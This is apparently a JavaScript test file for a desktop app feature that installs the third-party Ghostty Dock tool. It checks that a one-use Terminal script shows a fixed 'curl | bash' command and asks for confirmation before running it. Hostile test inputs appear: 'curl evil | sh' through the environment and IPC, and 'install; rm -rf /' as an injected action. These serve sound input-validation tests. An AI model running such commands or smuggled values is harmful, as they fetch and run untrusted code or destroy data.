'use strict';
// "Install Ghostty Dock…": when it is offered, what the one-use script does,
// the confirmation, and the watcher. Nothing is installed or opened: Terminal,
// the dialog, the browser and the filesystem's temp root are all fakes.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { testTempDir } = require('./helpers/tmp');
const I = require('../src/ghostty-dock-install.js');

const UPSTREAM = 'curl -fsSL https://raw.githubusercontent.com/andrewbakercloudscale/ghossty-dock/main/get.sh | bash';
const NOT_INSTALLED = { installed: false, trusted: false, reason: 'CLI not installed' };
const UNTRUSTED = { installed: true, trusted: false, reason: 'CLI needs jq' };
const READY = { installed: true, trusted: true, reason: 'ready' };

test('the install button shows only on Apple silicon macOS, with the integration on and Dock not installed', () => {
  assert.deepEqual(I.offer(NOT_INSTALLED, { platform: 'darwin', arch: 'arm64', mode: 'auto' }).show, 'install');
  assert.equal(I.offer(NOT_INSTALLED, { platform: 'darwin', arch: 'x64', mode: 'auto' }).show, null);
  assert.equal(I.offer(NOT_INSTALLED, { platform: 'linux', arch: 'arm64', mode: 'auto' }).show, null);
  assert.equal(I.offer(NOT_INSTALLED, { platform: 'darwin', arch: 'arm64', mode: 'off' }).show, null);
  assert.equal(I.offer(READY, { platform: 'darwin', arch: 'arm64' }).show, null);
  assert.deepEqual(I.offer(UNTRUSTED, { platform: 'darwin', arch: 'arm64' }), { show: 'recheck', reason: 'CLI needs jq' });
  assert.equal(I.offer(null, { platform: 'darwin', arch: 'arm64' }).show, null);
});

test('the command is the fixed upstream one-liner', () => {
  assert.equal(I.INSTALL_COMMAND, UPSTREAM);
  assert.equal(I.REPO_URL, 'https://github.com/andrewbakercloudscale/ghossty-dock');
  assert.ok(Object.isFrozen(I.ACTIONS));
});

test('the one-use script prints the command, waits for Return, then runs exactly that command, in a private self-deleting folder', () => {
  const root = testTempDir('px-dock-inst-');
  try {
    const s = I.writeScript({ tempDir: root });
    assert.match(path.basename(s.dir), /^plexiform-terminal-[A-Za-z0-9]+$/);
    assert.equal(path.basename(s.file), 'continue.command');
    assert.equal(fs.statSync(s.dir).mode & 0o777, 0o700);
    assert.equal(fs.statSync(s.file).mode & 0o777, 0o700);
    const body = fs.readFileSync(s.file, 'utf8');
    const lines = body.split('\n');
    assert.equal(lines[0], '#!/bin/zsh');
    assert.equal(lines[1], 'setopt pipefail');
    assert.match(lines[2], /^\/bin\/mkdir '.*\/started' 2>\/dev\/null \|\| exit 0$/);
    assert.match(lines[3], /^\/bin\/rm -f '.*continue\.command'$/);
    assert.match(lines[4], /^trap '.*rm -rf.*' EXIT$/);
    const ask = lines.findIndex((l) => l.includes('Press Return or type y to install; anything else cancels.'));
    const read = lines.indexOf('IFS= read -r reply || exit 1');
    const runs = lines.indexOf(UPSTREAM);
    assert.ok(ask > 0 && read > ask && runs === read + 2, 'asks, waits for a line, checks it, then runs');
    assert.match(lines[read + 1], /^\[\[ -z \$reply \|\| \$reply == \[yY\] \]\] \|\| \{ print -r -- 'Cancelled: nothing was installed\.'; exit 1; \}$/);
    assert.ok(lines.slice(0, read).some((l) => l.includes(UPSTREAM) && l.startsWith('print -r -- ')), 'shows the command before it runs');
    assert.equal(lines.filter((l) => l === UPSTREAM).length, 1, 'runs it once');
    assert.equal((body.match(/curl /g) || []).length, 2, 'once shown, once run, nothing else downloads');
    assert.match(body, /brew install jq/);
    s.cleanup();
    assert.equal(fs.existsSync(s.dir), false);
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
});

test('the script is the same whatever the environment holds', () => {
  const before = I.scriptBody('/t/plexiform-terminal-a/continue.command', '/t/plexiform-terminal-a');
  const saved = { ...process.env };
  try {
    Object.assign(process.env, { GHOSTTY_DOCK_INSTALL: 'curl evil | sh', HOME: '/evil', PATH: '/evil' });
    assert.equal(I.scriptBody('/t/plexiform-terminal-a/continue.command', '/t/plexiform-terminal-a'), before);
  } finally { for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k]; Object.assign(process.env, saved); }
});

test('launch opens the script in Terminal and cleans up when Terminal will not open', async () => {
  const root = testTempDir('px-dock-launch-');
  try {
    const opened = [];
    assert.deepEqual(await I.launch({ tempDir: root, open: async (f) => { opened.push(f); } }), { ok: true });
    assert.equal(opened.length, 1);
    assert.match(opened[0], /plexiform-terminal-[A-Za-z0-9]+\/continue\.command$/);
    const r = await I.launch({ tempDir: root, open: async () => { throw new Error('no Terminal'); } });
    assert.equal(r.ok, false);
    assert.equal(fs.readdirSync(root).length, 1, 'the failed one removed its folder');
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
});

test('the confirmation names the third party, the missing license, Terminal, Return and jq', () => {
  const d = I.confirmDialog();
  assert.deepEqual(d.buttons, ['Open Terminal to install', 'View on GitHub', 'Cancel']);
  assert.equal(d.cancelId, 2);
  assert.equal(d.defaultId, 2);
  for (const want of [/Andrew Baker/, /no license/, /not part of Plexiform/, /Terminal/, /Return/, /GitHub/, /macOS 13 or 14/, /jq/]) assert.match(`${d.message}\n${d.detail}`, want);
  assert.ok(d.detail.includes(UPSTREAM));
});

function controller({ dock = NOT_INSTALLED, answer = 0, launchOk = true, mode = 'auto' } = {}) {
  const log = { confirms: 0, launches: 0, github: 0, invalidated: 0, notes: [], changed: [], timers: [] };
  let state = dock;
  const c = I.createController({
    dock: { detect: () => state, invalidate: () => { log.invalidated += 1; } },
    getMode: () => mode,
    platform: 'darwin', arch: 'arm64',
    confirm: async () => { log.confirms += 1; return answer; },
    shell: { openExternal: async (u) => { log.github += 1; log.url = u; } },
    launchScript: async () => { log.launches += 1; return launchOk ? { ok: true } : { ok: false, error: 'Could not open Terminal: x' }; },
    notify: (t) => log.notes.push(t),
    changed: (s) => log.changed.push(s),
    watcherOpts: { setTimer: (fn) => { log.timers.push(fn); return 1; }, clearTimer: () => {} },
  });
  return { c, log, set: (d) => { state = d; } };
}

test('Install: confirm first; Cancel and GitHub launch nothing; Open Terminal launches once and starts watching', async () => {
  for (const [answer, want] of [[2, { cancelled: true }], [1, { opened: 'github' }]]) {
    const { c, log } = controller({ answer });
    const r = await c.act('install');
    assert.equal(r[Object.keys(want)[0]], Object.values(want)[0]);
    assert.equal(log.launches, 0);
    assert.equal(log.confirms, 1);
  }
  const { c, log, set } = controller({ answer: 0 });
  const r = await c.act('install');
  assert.equal(r.launched, true);
  assert.equal(log.launches, 1);
  assert.equal(r.watching, true);
  set(UNTRUSTED);
  log.timers[0]();
  assert.equal(log.notes.length, 0, 'installed but not trusted yet: keep watching');
  set(READY);
  log.timers[0]();
  assert.deepEqual(log.notes, [I.INSTALLED_MESSAGE]);
  assert.equal(log.changed.at(-1).message, I.INSTALLED_MESSAGE);
  assert.equal(c.watcher.running(), false);
  assert.ok(log.invalidated >= 2, 'every tick looks afresh');
});

test('Install is refused without asking when it is not offered; a failed Terminal open says so', async () => {
  for (const opts of [{ dock: READY }, { dock: UNTRUSTED }, { mode: 'off' }]) {
    const { c, log } = controller(opts);
    assert.ok((await c.act('install')).error);
    assert.equal(log.confirms, 0);
  }
  const { c } = controller({ launchOk: false });
  const r = await c.act('install');
  assert.match(r.error, /Could not open Terminal/);
  assert.equal(c.watcher.running(), false);
});

test('only the four action names do anything; GitHub opens the fixed URL; Check again re-detects', async () => {
  const { c, log } = controller({ dock: UNTRUSTED });
  for (const bad of ['send', 'keys', '', undefined, { action: 'install' }, 'install; rm -rf /']) assert.deepEqual(await c.act(bad), { error: 'unknown action' });
  await c.act('github');
  assert.equal(log.url, I.REPO_URL);
  const r = await c.act('recheck');
  assert.equal(r.show, 'recheck');
  assert.equal(log.invalidated, 1);
  assert.equal(log.changed.length, 1);
});

test('the watcher gives up after its window', () => {
  let t = 0;
  const gaveUp = [];
  const w = I.createWatcher({ detect: () => NOT_INSTALLED, invalidate: () => {}, onInstalled: () => assert.fail('not installed'), onGiveUp: (d) => gaveUp.push(d), setTimer: () => 1, clearTimer: () => {}, now: () => t, upTo: 600000 });
  w.start();
  t = 599999; w.tick();
  assert.equal(w.running(), true);
  t = 600000; w.tick();
  assert.equal(w.running(), false);
  assert.equal(gaveUp.length, 1);
  assert.equal(I.POLL_MS, 5000);
  assert.equal(I.WATCH_MS, 600000);
});

test('the IPC handler checks its sender and passes on only an action name', async () => {
  const handlers = {};
  const seen = [];
  I.register({
    utilityHandle: (ch, allowed, fn) => { handlers[ch] = (e, ...a) => (allowed(e) ? fn(e, ...a) : null); },
    allowed: (e) => e.page === 'settings' || e.page === 'home',
    controller: { act: async (a) => { seen.push(a); return { ok: true }; } },
  });
  assert.deepEqual(Object.keys(handlers), ['ghostty-dock-install']);
  assert.equal(await handlers['ghostty-dock-install']({ page: 'widget' }, 'install'), null);
  await handlers['ghostty-dock-install']({ page: 'settings' }, 'install', { command: 'curl evil | sh' });
  await handlers['ghostty-dock-install']({ page: 'home' }, { action: 'install' });
  assert.deepEqual(seen, ['install', '']);
});

test('a CLI without the app is "Check again", not ready; the watcher stops on a throw or when turned off', () => {
  assert.deepEqual(I.offer({ installed: false, trusted: true, reason: 'CLI found, app not in Applications' }, { platform: 'darwin', arch: 'arm64' }).show, 'recheck');
  const boom = I.createWatcher({ detect: () => { throw new Error('x'); }, invalidate: () => {}, onInstalled: () => {}, setTimer: () => 1, clearTimer: () => {} });
  boom.start();
  assert.doesNotThrow(() => boom.tick());
  assert.equal(boom.running(), false);
  let on = true;
  const notes = [];
  const w = I.createWatcher({ detect: () => READY, invalidate: () => {}, onInstalled: () => notes.push(1), active: () => on, setTimer: () => 1, clearTimer: () => {} });
  w.start();
  on = false;
  w.tick();
  assert.equal(w.running(), false);
  assert.deepEqual(notes, [], 'no "installed" note after Ghostty Dock was turned off');
});
